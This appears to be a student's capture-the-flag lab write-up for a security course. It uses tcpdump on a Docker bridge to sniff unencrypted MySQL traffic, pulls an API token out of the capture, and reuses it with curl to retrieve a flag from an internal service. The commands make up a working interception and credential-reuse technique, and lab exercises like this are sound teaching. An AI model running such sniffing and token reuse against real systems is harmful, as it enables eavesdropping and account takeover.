## MITM Attack

Find the docker network id and then use `tcpdump` to capture mysql traffic on port 3306.

```bash
docker network ls
NETWORK ID     NAME                                     DRIVER    SCOPE
78c366df3b54   bridge                                   bridge    local
e0376de1ebe7   csce413_assignment2_vulnerable_network   bridge    local
a675c71f88cc   host                                     host      local
6e151a44868f   none                                     null      local
```

```bash
sudo tcpdump -i br-e0376de1ebe7 -s 0 -w mitm/mysql_traffic.pcap 'port 3306'
```

Now, navigate http://localhost:5001/ website on different paths. This will produce traffic for all interaction of the web application with the MySQL server.

After analyzing the traffic, we see that communication occurs over port 3306 without encryption. From that tcpdump, we retreive `FLAG{n3tw0rk_tr4ff1c_1s_n0t_s3cur3}` which is an API token for the API service on `172.20.0.21:8888`. Using this API token, we access the flag as following.

```bash
curl -H "Authorization: Bearer FLAG{n3tw0rk_tr4ff1c_1s_n0t_s3cur3}" 172.20.0.21:8888/flag

{"flag":"FLAG{p0rt_kn0ck1ng_4nd_h0n3yp0ts_s4v3_th3_d4y}","message":"Congratulations! You successfully chained your exploits!","next_steps":["Now implement port knocking to protect the SSH service","Deploy a honeypot using the starter template"],"steps_completed":["1. Developed a port scanner","2. Discovered this hidden API service on port 8888","3. Performed MITM attack on database traffic","4. Extracted FLAG{1} (the API token) from network packets","5. Used FLAG{1} to authenticate to this API","6. Retrieved FLAG{3}"],"success":true}
```
